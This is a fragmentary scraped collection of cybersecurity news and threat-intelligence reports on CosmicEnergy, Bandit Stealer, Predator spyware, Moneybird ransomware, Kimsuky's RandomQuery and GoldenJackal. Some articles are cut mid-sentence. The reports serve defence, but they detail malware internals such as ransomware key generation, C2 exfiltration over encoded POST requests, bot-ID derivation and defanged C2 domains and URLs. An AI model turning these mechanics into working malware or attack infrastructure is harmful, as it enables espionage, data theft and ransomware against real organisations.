authentication scheme, including OAuth, is implementing it securely … implementing OAuth securely is still a non-trivial task,” said Parkin.Stephen Weigand is managing editor and production manager for SC Media.

      "text": "  Threat research group Mandiant identified the new malware, which it calls CosmicEnergy, when the code was uploaded to a public malware scanning utility in December 2021.Mandiant’s report said CosmicEnergy was a rare find because specialized operational technology (OT) or industrial control system (ICS) malware capable of causing cyber physical impacts were seldom discovered or disclosed. Mandiant said a unique aspect of CosmicEnergy was that there was evidence to suggest it had been developed by a contractor as a red teaming tool for simulated power disruption exercises hosted by Russian cybersecurity company Rostelecom-Solar.“This discovery suggests that the barriers to entry are lowering for offensive OT threat activity since we normally observe these types of capabilities limited to well resourced or state sponsored actors,” Mandiant said.Like CosmicEnergy, the Industroyer variants targeted IEC-104 devices, issuing IEC-104 on/off commands to interact with RTUs and possibly also using an MSSQL server to access OT systems.“The discovery of COSMICENERGY illustrates that the barriers to entry for developing offensive OT capabilities are lowering as actors leverage knowledge from prior attacks to develop new malware,” Mandiant’s report said.“Given that threat actors use red team tools and public exploitation frameworks for targeted threat activity in the wild, we believe COSMICENERGY poses a plausible threat to affected electric grid assets.”Once CosmicEnergy accessed a target’s OT systems, it could initiate power disruptions by sending remote commands to powerline switches and circuit breakers. Mandiant said CosmicEnergy achieved that using two derivative components which it called Piehop and Lightwork.Piehop was a Python tool which connected to a remote MSSQL server to upload files and issue remote commands to an RTU. It used Lightwork, written in C++, to issue the IEC-104 on/off commands to the remote system before immediately deleting the executable.Mandiant said its analysis of CosmicEnergy highlighted several trends in the OT threat landscape, including abuse of “insecure by design” protocols such as IEC-104.“While OT-oriented malware families can be purpose built for a particular target environment, malware that takes advantage of insecure by design OT protocols, such as LIGHTWORK’s abuse of the IEC-104 protocol, can be modified and employed multiple times to target multiple victims,” the report said.“The availability of open source projects that implement OT protocols can lower the barrier of entry for actors attempting to interact with OT devices. However, proprietary OT protocols will likely continue to require custom protocol implementations.”Mandiant recommended several actions organizations potentially at risk from CosmicEnergy should take, including identifying and investigating any unauthorized Python-packaged executables on their OT systems or with access to OT resources, and monitoring certain systems and MSSQL servers with access to OT resources.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

The goal is to escalate privileges and execute itself with administrative access, thereby effectively bypassing security measures to harvest wide swathes of data.That said, Microsoft's access control mitigations to prevent unauthorized execution of the tool means an attempt to run the malware binary as an administrator requires providing the necessary credentials.\"By using the runas.exe command, users can run programs as an administrator or any other user account with appropriate privileges, provide a more secure environment for running critical applications, or perform system-level tasks,\" Trend Micro said.\"This utility is particularly useful in situations where the current user account does not have sufficient privileges to execute a specific command or program.\"Bandit Stealer incorporates checks to determine if it's running in a sandbox or virtual environment and terminates a list of blocklisted processes to conceal its presence on the infected system.It also establishes persistence by means of Windows Registry modifications before commencing its data collection activities that include harvesting personal and financial data stored in web browsers and crypto wallets.Bandit Stealer is said to be distributed via phishing emails containing a dropper file that opens a seemingly innocuous Microsoft Word attachment as a distraction maneuver while triggering the infection in the background.Trend Micro said it also detected a fake installer of Heart Sender, a service that automates the process of sending spam emails and SMS messages to numerous recipients, that's used to trick users into launching the embedded malware.Data amassed from stealers can benefit the operators in many ways, allowing them to exploit purposes such as identity theft, financial gain, data breaches, credential stuffing attacks, and account takeovers.The stolen information can also be sold to other actors, serving as a foundation for follow-on attacks that could range from targeted campaigns to ransomware or extortion attacks.\"Russian Market offers five million logs for sale which is around ten times more than its nearest forum rival 2easy,\" the company said.\"Russian Market is well-established among Russian cybercriminals and used extensively by threat actors worldwide.

      "text": " Security researchers at Cisco Talos and the Citizen Lab have presented a new technical analysis of the commercial Android spyware 'Predator' and its loader 'Alien,' sharing its data-theft capabilities and other operational details.Predator is a commercial spyware for mobile platforms (iOS and Android) developed and sold by Israeli company Intellexa.The spyware can record phone calls, collect information from messaging apps, or even hide applications and prevent their execution on infected Android devices.Alien fetches the Predator component from an external address and launches it on the device or upgrades the existing payload with a newer version if available.After that, Alien continues to operate on the device, facilitating discreet communications between the spyware's components by hiding them within legitimate system processes and receiving commands from Predator to execute while bypassing Android security (SELinux).An SELinux bypass is a crucial function of the spyware, differentiating it from $150-300/month info-stealers and trojans sold on Telegram.Cisco explains that Alien achieves that by abusing SELinux's contexts that determine which users and what level of information is permitted on each process and object in the system, lifting existing restrictions.Moreover, Alien listens for \"ioctl\" (input/output control) commands for the spyware's internal-component communications, which SELinux does not inspect.Finally, Alien saves stolen data and recordings on a shared memory space, then moves it to storage, eventually exfiltrating it through Predator. This process triggers no access violations and goes unnoticed by SELinux.Predator is the spearhead module of the spyware, arriving on the device as an ELF file and setting up a Python runtime environment to facilitate the various espionage functionalities.The amount of logging performed on the compromised device changes depending on whether the Predator implant is a development or a stable version.The functionalities facilitated by Predator's Python modules, and performed together with Alien, include arbitrary code execution, audio recording, certificate poisoning, application hiding, app execution prevention (after reboot), and directory enumeration.The spyware's loader, Alien, checks if it runs on a Samsung, Huawei, Oppo, or Xiaomi, and if there's a match, it recursively enumerates the contents of directories that hold user data from email, messaging, social media, and browser apps.It also enumerates the victim's contact list and lists private files in the user's media folders, including audio, images, and video.The spyware also uses certificate poisoning to install custom certificates to the current user-trusted certificate authorities, allowing Predator to conduct man-in-the-middle attacks and spy on TLS-encrypted network communication.Cisco comments that Predator is careful with this ability, not installing the certificates at the system level to avoid interference at the operational level of the device, which might tip victims that something's wrong.\"From an attacker's perspective, the risks outweigh the reward, since with user-level certificates, the spyware can still perform TLS decryption on any communication within the browser,\" explain the researchers.Even though Cisco and Citizen Lab went deep into the spyware's components, the researchers are still missing details about two modules, namely 'tcore' and 'kmem,' both loaded in Predator's Python runtime environment.The analysts believe that tcore performs geolocation tracking, snapping images from the camera, or simulating a device power-off.Cisco's hypothesis for the kmem module is that it provides arbitrary read and write access into the kernel address space.Since neither could be retrieved from infected devices, parts of Intellexa's Predator spyware remain uncharted."

It's a very messy ecosystem of threat actors.\"The script did triple duty. On one hand, it opened login pages for Energias de Portugal and the Portuguese Tax and Customs Authority, with the purpose of drawing attention away from its second function: dropping a malware loader. If a victim actually entered their Energias or Customs credentials — in the latter's case, often government-issued credentials — the program harvested them for future use.Next, the malware loader would download PeepingTitle, an info-stealing backdoor written in Delphi. Delphi is a general purpose programming language that one rarely hears much about in cyber circles up north.\"It's funny you mention that,\" Hegel says, when the topic comes up. \"When we first started looking into this campaign, knowing it was linked to Brazil, we were immediately like: It's probably Delphi.\" There isn't any identifiable technical reason for Delphi's relatively localized popularity, Hegel thinks. \"A lot of it's just because of the way that education is done there, because everyone out in that region tends to know it.\"The Delphi-driven PeepingTitle works by tracking the websites a victim has visited. If someone visited a domain belonging to a Portuguese financial institution, the malware awakens: connecting to a C2 server, taking screenshots, exfiltrating data, and potentially staging further malware.In general, Hegel says, \"it's on par with what you expect of a normal financial malware. It purely focuses on being able to get this data outbound and limit detection as much as possible.\"That said, Magalenha targeted both personal and financial data from individuals and institutions alike in the government and private sectors. \"So there's more than just your regular financial theft — there are clues to ulterior objectives that they may be pursuing, like initial access brokering,\" Hegel adds.Also notable about PeepingTitle is that it comes in two variants. But the variants have hardly any meaningful difference between them, besides the fact that one captured a victim's browser window, while the other captured the entire screen. Hegel thinks \"it may indicate that the attackers evolved to add second capabilities later on, or it's just purely experimentation.\"\"I think this points to the fact that it's not extremely well planned out,\" he adds.Besides the alike variants, he points to other evidence of the hackers' lack of discipline, like their experimentation with different infrastructure — swapping American provider DigitalOcean for a more lax Russian service, TimeWeb, for instance — and the relatively unfocused nature of their information stealing.\"If this was somebody more capable,\" Hegel concludes, \"they might go through the process of thinking about what they want to connect to and steal, and do it in a single package rather than multiple packages, which increases the potential of getting caught. Instead, there's just a lot of experimenting, a lot of playing, and not a lot of deep, strategic planning.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

The use of a new ransomware, written in C++, is noteworthy, as it demonstrates the group’s expanding capabilities and ongoing effort in developing new tools.Agrius’s actions leading to the deployment of Moneybird correlates to previous reports of the group’s activity.Agrius’ first foothold was established by exploiting vulnerabilities within public-facing web servers, leading to the deployment of unique variants of ASPXSpy. The exploitation and the post-exploitation activities were carried out using public VPN services nodes, most prominently ProtonVPN nodes in Israel.The ASPXSpy webshells were deployed in a unique fashion, hidden inside “Certificate” text files. This method is tied to past observed group activities. To use the webshell, the actor decoded the content of the file into a separate ASPX file.Following the deployment of webshells, the threat actor was observed utilizing several publicly available tools to perform recon, move laterally, harvest credentials, and exfiltrate data. The tools include:Interestingly enough, the actor performed most of the activity while manually connected through RDP. To download some of the payloads, the actor opened a browser and connected to the legitimate file sharing services ufile[.]io and easyupload[.]io that hosted the malicious files.One of the files the threat actor downloaded was the ransomware executable stored within an archive – Moneybird.Moneybird is written in C++ and contains an indicative PDB path: C:\\Users\\user\\Desktop\\moneybird\\x64\\Release\\moneybird.pdb. The name embedded within the ransomware sample reveals that the encryptor shares the same name that appears in the attack ransom note for the attack: Moneybird.Many recent ransomware strains typically support command-line parameters that enable attackers to customize malware functionality on top of the malware’s embedded configuration. This specific threat lacks any command-line parsing capability. Instead, it includes a configuration blob embedded within the tool itself, which makes it less suitable for mass campaigns with different environments.This configuration contains several key elements that are used when the malware is executed. The sample ignores the first DWORD. The second one contains an integer value representing the number of milliseconds the malware waits before executing.After these initial values, the configuration includes four additional DWORDs.It is noteworthy to mention that the drawback of this approach is its lack of effectiveness in comparison to other ransomware strains that utilize the WIN API GetSystemInfo or directly access PEB→dwNumberOfProcessors. By using these methods, they can dynamically determine the number of CPUs per system and assign the encryption logic an appropriate number of threads based on this number.Immediately following the public key, the configuration contains an integer value that determines the number of null-terminated strings that come next. These strings indicate the paths on the target machine that the sample encrypts, which is somewhat unusual as these malware usually try to cipher as much data as possible. In this particular case, there is only one path F:\\User Shares, resulting in all other system paths being omitted. The remaining space in the configuration (up to 1024 bytes, including the previous elements) is reserved for possible additional system path entries. If no more entries are added, the remaining space is filled with the character “A”, as in this sample.If there is no path entry in the configuration, the malware behaves in a more generic fashion and uses the WIN API function GetLogicalDrives to obtain a list of currently available disk drives on the targeted machine and then starts to process it.The configuration structure in decompiled C form:The encryption logic of this ransomware sample depends on several embedded libraries, including “libgcrypt”, which is easily identifiable in the sample strings.Finally, the malware is also linked with a copy of the “cryptopp” library. This library can be easily identified by strings that directly reference its name, as well as a distinctive test string that is used as text to encrypt in many versions of this library.As you can see in the image above, the IV 012345678901255 for AES-256-GCM is hardcoded inside the ciphering function while the key is passed as the last parameter to the function.The code responsible for the generation of the key:This code is executed for each file, so each one is assigned a unique encryption key. To generate a key, the sample concatenates a GUID (marked in red) obtained through the WIN API CoCreateGuid with a random number (marked in green) generated using the rand() function. The seed for the rand() function is based on the system time. Then, 8 bytes of the file content (marked in blue) to be encrypted is concatenated. Finally, the full path for the target file (marked in purple) is added, but only 4 bytes of it are used as the last part of the key as it completes the 32-byte chunk.After the full path of the target file that overflows the 32-byte aes_key, the malware adds the length of the path, creating a kind of secondary structure:Our analysis of incidents involving Moneybird reveals the ongoing effort of Agrius to utilize ransomware to make an impact. Although Agrius has used different aliases in the past, public reports up to now have tied most of their destructive activities to variants of Apostle, which acted as wipers or ransomware. The use of a new ransomware demonstrates the actor’s additional efforts to enhance capabilities, as well as hardening attribution and detection efforts.Despite these new “covers”, the group continues to follow its usual behavior and utilize similar tools and techniques as before. Moneybird, like many other ransomware, is a grim reminder of the importance of good network hygiene, as significant parts of the activity could have been prevented early on.Moneybird itself, although not particularly complex, has a number of intriguing features that appear to have been designed for specific targets. Some of these specialty features make the malware less practical for use in multiple unrelated campaigns. This emphasizes the malware’s targeted nature, including the use of “targeted paths” which, in the specific sample we analyzed, makes the ransomware ignore most of the files on the target machine.Check Point customers remain protected from the threats described in this research.Subscribe for cpr blogs, news and more© 1994- Check Point Software Technologies LTD.

      "title": "Iranian hackers use new Moneybird ransomware to attack Israeli orgs",
      "text": " A suspected Iranian state-supported threat actor known as 'Agrius' is now deploying a new ransomware strain named 'Moneybird' against Israeli organizations.Check Point researchers say the threat actors initially gain access to corporate networks by exploiting vulnerabilities in public-facing servers, giving Agrius an initial foothold within the organization's network.Next, the hackers hide behind Israel-based ProtonVPN nodes to deploy variants of ASPXSpy webshells hidden inside \"Certificate\" text files, a tactic that Agrius has used in previous campaigns.Having deployed the webshells, the attackers proceed to use open-source tools that help in network reconnaissance using SoftPerfect Network Scanner, lateral movement, secure communication using Plink/PuTTY, credential stealing with ProcDump, and the exfiltration of data using FileZilla.In the next phase of the attack, Agrius fetches the Moneybird ransomware executable from legitimate file hosting platforms like 'ufile.io' and 'easyupload.io.'Upon launch, the C++ ransomware strain will encrypt target files using AES-256 with GCM (Galois/Counter Mode), generating unique encryption keys for every file and appending encrypted metadata at their end.In the cases seen by Check Point, the ransomware only targeted \"F:\\User Shares,\" a common shared folder on corporate networks used to store corporate documents, databases, and other collaboration-related files.This narrow targeting indicates that Moneybird aims more at causing business disruption than locking down the impacted computers.Check Point explains that data restoration and file decryption would be extremely challenging since the private keys used for encrypting each file are generated using data from the system GUID, file content, file path, and random numbers.After the encryption, ransom notes are dropped on the impacted systems urging the victim to follow the provided link within 24 hours for directions on restoring their data.\"Hello WE ARE MONEYBIRD! All of your data encrypted! If u want you to restore them follow this link with in 24H,\" reads the Moneybird ransom note.Unlike previous attacks linked to Agrius, Moneybird is believed to be ransomware, rather than a wiper, meant to generate revenue to fund the threat actors' malicious operations.However, in the case seen by Check Point Research, the ransom demand was so high that it was known from the start that a payment would unlikely be made, making the attack essentially destructive.\"Yes negotiations could be possible but the demand was extremely high, which leads us to believe that it’s part of the trick. They knew no one would pay so the damage and data leaked was expected. It was not a wiper,\" Eli Smadga, Research Group Manager at Check Point Research, told BleepingComputer.Check Point explains that Moneybird lacks command-line parsing capabilities that allow victim-specific configurations and more deployment versatility and instead relies on an embedded configuration blob.This means the ransomware's behavior parameters are pre-defined and cannot be easily adjusted for each target or circumstance, making the strain unsuitable for mass campaigns.For Agrius, however, Moneybird is still an effective business-disruption tool, and further development leading to the release of newer, more capable versions might make it a formidable threat to a broader range of Israeli organizations."

      "title": "Quantum attack would trigger Great Depression, think tank warns | SC Media",
      "text": "  Never mind the cyber doomsday predictions of artificial intelligence ravaging the world as we know it. Now you can add a future quantum computer-powered cyberattack to the list of technologies-gone-wrong that experts warn could decimate the U.S. economy and trigger another Great Depression.The Hudson Institute says the financial sector must move quickly to protect itself against such an attack, even though the quantum computing power needed by an adversary may not be available for several years. “Despite the many benefits that quantum computing is poised to bring to the financial sector, the threat of quantum-enabled cyberattacks and, more specifically, quantum decryption holds the potential to outweigh any gains in computational efficiency and accuracy,” authors Arthur Herman and Alexander Butler wrote.A small group of government-funded labs, industry titans like IBM and Google, have been working on quantum computing for years. Each has steadily increasing the number of cubic bits – or qubits – their supercomputers are capable of processing.The Hudson Institute report said the financial sector needs to begin preparing now for future quantum attacks.“The impact of a cascading quantum attack on major banks, the Federal Reserve, or stock exchanges and derivative exchanges could be calamitous for the United States and the global economy. The risk of a catastrophic attack and financial collapse rises to levels that eclipse the 2008–09 crisis or the Great Depression.”The report focused on an attack that results in a breakdown in the interbank payment system, specifically real-time gross settlement (RTGS) systems such as the Fedwire Funds Service that the U.S. Federal Reserve provides.“Once a cryptographically relevant quantum computer exists, it could access the Fedwire network and initiate a disruption to payments, cause coordination failures within the system that hinder efforts toward resilience, and ultimately irreparably affect the U.S. economy,” the report said.The Hudson Institute analyzed the impact such a hack would have on the economy and concluded it would result in a 10 to 17 percent decline in annual real GDP resulting in indirect losses of between $2 trillion and $3.3 trillion.Experts agree that today, the U.S. financial sector is dangerously vulnerable to traditional cyberattacks. Even if it were to reduce that vulnerability, the sector would remain susceptible to attacks by future quantum computers capable of defeating public encryption regimes.Research by the New York Federal Reserve found an attack on a single large bank could spread to nearly 40 percent of the U.S. financial network.“The high degree of interconnectivity within the financial sector can augment financial contagion and spread systemic risk,” the Hudson Institute report said.“Given the role of payment and settlement systems as critical financial market infrastructure, any successful attack against an RTGS system could have extreme consequences. [I]f conditions prevent the settlement of cross-border and domestic transactions between banks operating within the Fedwire RTGS system, a cyberattack could lead to liquidity issues for receiving parties, contract breaches, and payment and obligation failures, among other issues.”The U.S. financial sector stood out as a prime target for a cyberattack, in terms of both exposure and potential impact, the Hudson Institute said.“Given their high dependence on technology, numerous network connections, and vital role in the financial system, systematically important RTGS systems—such as Fedwire—are prime targets for malign cyber actors keen on causing maximum damage to the system.”The Hudson Institute report recommends the Fedwire protect itself from future quantum computer threats adopting the NIST PQC standards and replacing legacy encryption systems. It also recommends Congress set a deadline for all 12 Federal Reserve banks to be quantum-secure.“If you were having a dispute with the United States in other ways and you wanted to make it more complicated, why not take down the financial system as a distraction?”John Prisco, CEO of Quantum Safe, said urged a multi-pronged strategy to thwart a quantum attack rather than relying on one encryption technology. “Imagine if China had already figured out how to break into CRYSTALS-Kyber. That would be a disaster, but would they tell us? I don’t think so,” he said.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": "  Today’s columnist, Aron Brand of CTERA, writes about how the ILOVEYOU virus ushered in the era of social engineering in the digital world. (Photo by Antoine Serra/Sygma/Sygma via Getty Images)Twenty-three years ago, the digital world witnessed a cyberattack that would forever change our approach to cybersecurity. On May 5, 2000, the ILOVEYOU worm, also known as the Love Bug or Love Letter For You, infected more than 10 million Windows personal computers within days.The seemingly innocent \"love letter\" email attachment proved irresistible to many, showing just how susceptible humans are to social engineering tactics. Despite technological advancements, the human brain remains the one vulnerability that's still the most difficult to fix. As we venture further into the world of artificial intelligence, large language models like ChatGPT have the potential to revolutionize many aspects of our lives. However, this technology also poses a significant risk. AI-generated text, combined with deepfake technologies, can create convincing social engineering attacks on an unprecedented scale.Threat actors can tailor-make these attacks to target individuals or organizations, exploiting the human tendency to trust and engage with familiar content. Experts predict the risk of these attacks will soon reach unprecedented heights with the increased use of deepfake technology. Attackers can now create incredibly realistic images, audio, and video to bolster their malicious campaigns, posing a significant challenge for individuals to distinguish between reality and deception.Given the ever-evolving threat landscape, it’s crucial to educate ourselves and others about the importance of cybersecurity and the potential risks of social engineering. By understanding these tactics, we can better identify and defend against them.Organizations must prioritize comprehensive cybersecurity training for their employees, with a strong emphasis on the human aspect of security. It's essential to raise awareness about the increasing risk of extremely convincing, highly-personalized scam messages that can easily trick even the most tech-savvy individuals. With the advancement of technology, we must remain vigilant and cautious when interacting with digital content, particularly unsolicited emails, attachments, or messages from unknown sources. As we enter an age where hackers can convincingly fake voices and even video messages, it's critical that we educate our employees, parents, and loved ones about the possibility of scam messages, including those that may appear to come from familiar people.In addition to organizations, software vendors have a responsibility to prioritize the addition of usability and technological features to enhance security for their users. This includes the incorporation of end-to-end authentication measures for messages to prevent unauthorized access and reduce the risk of phishing attacks. Vendors should also implement features that warn users of suspicious or potentially fake content, especially those that appear to come from familiar sources. By focusing on these critical guardrails, software vendors can help create a safer digital environment for their users, establish trust, and protect their reputation in the market.The ILOVEYOU worm serves as a poignant reminder that no matter how advanced our security measures become, security pros will always find the human factor the most challenging to address. As we continue to navigate the digital age and confront new threats posed by AI and deepfake technologies, we must remember the lessons learned from this simple, yet devastatingly effective cyberattack and strive to strengthen our \"human firewall\" to protect ourselves and our digital lives.Aron Brand, chief technology officer, CTERAUkraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.Israel had its technology, logistics, and transportation industries targeted by Iranian advanced persistent threat operation Charming Kitten, also known as APT35 and Imperial Kitten, last month amid its ongoing war with Palestinian militant group Hamas, according to The Record, a news site by cybersecurity firm Recorded Future.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

This malware facilitates credential theft and lateral movement, ideal for carrying out espionage operations.The researchers warned: “[Lazarus]is one of the highly dangerous groups that are actively launching attacks worldwide. Therefore, corporate security managers should utilize attack surface management to identify the assets that could be exposed to threat actors and practice caution by applying the latest security patches whenever possible.”They added that due to Lazarus’ focus on the DLL side-loading technique during initial infiltrations, “companies should proactively monitor abnormal process execution relationships and take preemptive measures to prevent the threat group from carrying out activities such as information exfiltration and lateral movement.”"

      "text": " By Aleksandar Milenkoski and Tom HegelSentinelLabs has been tracking a targeted campaign against information services, as well as organizations supporting human rights activists and defectors in relation to North Korea. The campaign focuses on file reconnaissance, and exfiltrating system and hardware information, laying the groundwork for subsequent precision attacks. Based on the infrastructure used, malware delivery methods, and malware implementation, we assess with high confidence that the campaign has been orchestrated by the Kimsuky threat actor.Kimsuky is a suspected North Korean advanced persistent threat (APT) group known for targeting organizations and individuals on a global scale. Active since at least 2012, the group regularly engages in targeted phishing and social engineering campaigns to collect intelligence and gain unauthorized access to sensitive information, aligning with the interests of the North Korean government.RandomQuery is a constant staple in Kimsuky’s arsenal and comes in various flavors. This campaign specifically uses a VBScript-only implementation. The malware’s ability to exfiltrate valuable information, such as hardware, operating system, and file details, indicates its pivotal role in Kimsuky’s reconnaissance operations for enabling tailored attacks.Finally, this campaign highlights Kimsuky’s recent extensive use of less common top-level domains (TLDs) for their infrastructure, such as .space, .asia, .click, and .online. The group also uses domain names that mimic standard .com TLDs, aiming to appear legitimate.Kimsuky makes use of specially crafted phishing emails to deploy RandomQuery. The phishing emails are sent to targets from an account registered at the South Korean email provider Daum, a standard Kimsuky phishing practice. Recent sender email addresses include bandi00413[@]daum.net.The attached document is a CHM file stored in a password-protected archive. Aligning with the targeting focus of Kimsuky in this campaign, the lure document is entitled “Difficulties in activities of North Korean human rights organizations and measures to vitalize them” and presents a catalog of challenges pertaining to human rights organizations.Consistent with known Kimsuky tactics, the CHM file contains a malicious Shortcut object that activates on the Click event. The object:The RandomQuery variant that Kimsuky distributes first configures the Internet Explorer browser by editing registry values under HKCU\\Software\\Microsoft\\Internet Explorer\\Main:RandomQuery also sets the registry value HKCU\\Software\\Microsoft\\Edge\\IEToEdge\\RedirectionMode to 0, which stops Internet Explorer from redirecting to the Microsoft Edge browser.These Internet Explorer configurations enable the uninterrupted use of the browser by RandomQuery, whose earlier variants are known to use the InternetExplorer.Application object when communicating with C2 servers. However, the RandomQuery variant we analyzed does not use this object, but leverages Microsoft.XMLHTTP for this purpose.RandomQuery then proceeds to gather and exfiltrate information about the infected platform, structured into three classes that the malware refers to as Basic System, Specific Folder, and Process List.The malware first gathers system and hardware information using the Win32_ComputerSystem, Win32_OperatingSystem, and Win32_Processor WMI classes, such as: computer name, processor speed, OS version, and the amount of physical memory available to the system. RandomQuery refers to this information as Basic System information.The malware refers to this information as Specific Folder information: It provides the attackers with a wealth of user- and platform-related information, such as installed applications, user document details, and frequented websites.RandomQuery also enumerates the process and session IDs of running processes using the Win32_Process WMI class. The malware refers to this information as Process List information.To exfiltrate the gathered information, RandomQuery first Base64-encodes it, and then constructs and issues an HTTP POST request containing the information to a C2 server URL (for example, http[://]file.com-port.space/indeed/show[.]php?query=97). We observed that the C2 URLs RandomQuery uses for exfiltration overlap with the URLs from which RandomQuery itself is downloaded, with a difference in the value of the query parameter.The variants we analyzed use c2xkanZvaXU4OTA as a boundary string separating header values from the exfiltrated information stored in the POST request. Pivoting on this string enabled us to identify additional RandomQuery variants used by Kimsuky in the past. This is a further indication of the threat group consistently using this malware in its targeted campaigns.These variants differ to various extents from those we observed in Kimsuky’s latest campaign. This includes features such as enumeration of deployed security products, focus on Microsoft Word documents when enumerating files, and execution of additional malicious code. Kimsuky continuously adapts its RandomQuery arsenal to the task at hand, with the current iteration focussing on information exfiltration and file reconnaissance.This latest campaign is tied to infrastructure abusing the .space, .asia, .click, and .online TLD’s, combined with domain names mimicking standard .com TLDs. Noteworthy examples include com-def[.]asia, com-www[.]click, and com-otp[.]click. Placed into a full URL path, an average user is less likely to spot obvious suspicious links.For this latest campaign, the threat actor used the Japan-based domain registration service Onamae for primary malicious domain purchasing. This particular cluster of activity began on May 5th 2023, and continues as of this report. ABLENET VPS Hosting is used by the actor following domain registration.We continue to closely monitor the persistent attacks carried out by Kimsuky and its continuously advancing attack toolkit. These incidents underscore the ever-changing landscape of North Korean threat groups, whose remit not only encompasses political espionage but also sabotage and financial threats.It is imperative for organizations to familiarize themselves with the TTPs employed by suspected North Korean state-sponsored APTs and to adopt appropriate measures to safeguard against such attacks. The correlation between recent malicious activities and a broader range of previously undisclosed operations attributed to North Korea emphasizes the importance of maintaining a state of constant alertness and fostering collaborative efforts.96d29a2d554b36d6fb7373ae52765850c17b68df\n84398dcd52348eec37738b27af9682a3a1a08492\n912f875899dd989fbfd64b515060f271546ef94c\n49c70c292a634e822300c57305698b56c6275b1c\n8f2e6719ce0f29c2c6dbabe5a7bda5906a99481c\n0288140be88bc3156b692db2516e38f1f2e3f494com-port[.]space\ncom-pow[.]click\ncom-def[.]asia\ncom-www[.]click\ncom-otp[.]click\ncom-price[.]space\nde-file[.]online\ncom-people[.]click\nkr-angry[.]click\nkr-me[.]click\ncf-health[.]click\ncom-hwp[.]space\ncom-view[.]online\ncom-in[.]asia\nko-asia[.]click\ndb-online[.]spaceGet notified when we post new content.Thanks!

      "title": "GoldenJackal APT and its malicious toolset | Securelist",
      "text": " Solutions for:ThreatsCategories23 May 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsGoldenJackal is an APT group, active since 2019, that usually targets government and diplomatic entities in the Middle East and South Asia. Despite the fact that they began their activities years ago, this group is generally unknown and, as far as we know, has not been publicly described.We started monitoring the group in mid-2020 and have observed a constant level of activity that indicates a capable and stealthy actor. The main feature of this group is a specific toolset of .NET malware, JackalControl, JackalWorm, JackalSteal, JackalPerInfo and JackalScreenWatcher intended to:Based on their toolset and the attacker’s behaviour, we believe the actor’s primary motivation is espionage.We have limited visibility on their infection vectors, but during our investigations, we observed the usage of fake Skype installers and malicious Word documents.The fake Skype installer was a .NET executable file named skype32.exe that was approximately 400 MB in size. It was a dropper containing two resources: the JackalControl Trojan and a legitimate Skype for business standalone installer. This tool was used in 2020.Malicious document – first pageThe document was named “Gallery of Officers Who Have Received National And Foreign Awards.docx” and appears as a legitimate circular distributed to collect information about officers decorated by Pakistan’s government. It’s worth noting that the first description of the Follina vulnerability was published on May 29, 2022 and this document appears to have been modified on June 1, two days after publication, and was first detected on June 2.The document was configured to load an external object from a legitimate and compromised website:hxxps://www.pak-developers[.]net/internal_data/templates/template.html!Code snippet used to load the remote resourceCode snippet used to exploit the Follina vulnerabilityThe decoded string is:Decoded scriptThe exploit downloads and executes an executable file hosted on the legitimate compromised website, and stores it in the following path: “%Temp%\\GoogleUpdateSetup.exe”. The downloaded file is the JackalControl malware.In other cases, we do not have a real infection vector, but we observed a system compromised during lateral movements. Specifically, we observed the attacker using the psexec utility to start a malicious batch script.\nThe batch script performs a variety of actions, such as installing Microsoft .Net Framework 4, infecting the system with the JackalControl Trojan, and collecting information about the system.This is a Trojan that allows the attackers to remotely control the target machine through a set of predefined and supported commands. These are received via an HTTPS communication channel facilitated between the malware and the C2 servers, and can instruct the implant to conduct any of the following operations:During the last few years, the attackers updated this tool multiple times and we observed multiple variants. We are going to describe the latest version, which was observed in January 2023 (8C1070F188AE87FBA1148A3D791F2523).The Trojan is an executable file that can be started as a standard program or as a Windows service.It expects an argument, which can be equal to one of the following values:The malware arguments and the related malware behavior change according to the variants. Some variants offer only two arguments:Other variants can install themselves with different persistence mechanisms. The malware’s execution flow is determined by the arguments provided in the command line with which it is run.Over the years the attackers have distributed different variants: some include code to maintain persistence, others were configured to run without infecting the system; and the infection procedure is usually performed by other components, such as the batch script mentioned above.The malware starts its activities by generating a BOT_ID that is a unique value used to identify the compromised system. This value is derived from several other host-based values:The UUID value obtained from the following WMI query:\nThe machine GUID obtained from the following registry key:\nThe list of attached drives, obtained from another WMI query, which in turn allows them to determine the ‘SerialNumber’ of ‘PHYSICALDRIVE0’:\nThe collected information is concatenated together in a byte array and then hashed with MD5, which is used as a seed for the creation of the BOT_ID. The algorithm used for the generation of the latter simply sums every two consecutive bytes from the resulting MD5 hash and places the resulting byte (modulus 256) as a single byte of the final BOT_ID. This logic is described in the code snippet below, taken from the malware.Code snippet used to generate the BOT_IDThe resulting BOT_ID is used also to initialize the DES key and IV, which are then used to encrypt communication with the C2.The malware communicates using HTTP POST requests where data arguments will be carried in encoded form as part of the request’s body. The overall request structure will then appear as follows:\nA valid response should in turn be formed in the following way:\nThe response is decoded with base64: the resulting payload is an array of strings, where the used delimiter is the standard Windows new line sequence – “\\r\\n”. Each line is decoded again with base64, decrypted with DES, and decompressed with the GZIP algorithm.Each command has the following structure:Command structureThe command type must be equal to one of the following codes:The Command Data field is intended to carry information on the command arguments and has a different structure for each action type, as specified below:The command results are usually composed into a message that also includes the values of the underlying command type and command ID, which uniquely identifies an instance of a command issued to the malware. The three values are compressed with GZIP, encrypted with DES, and encoded with base64.The resulting payload is concatenated with the BOT_ID using the “|” char, encoded again with base64, after which it gets uploaded to the remote server using the aforementioned POST request format.The malware location is selected with a specific procedure. It enumerates all subdirectories in CommonApplicationData and randomly selects one to which its copy will be saved. The generated file name will be suffixed with the subdirectory’s names and appended with another static value, Launcher.exe, as outlined below:\nIf the operation succeeds, it also changes the new file timestamp and makes it the same as that of the selected subdirectory.If the operation fails, it randomly selects another directory and tries again to copy the malware.If the operation fails with all subdirectories, it tries to use a list of hard-coded directory names:If all the previous attempts fail, it tries to use the same procedure in the following locations:The 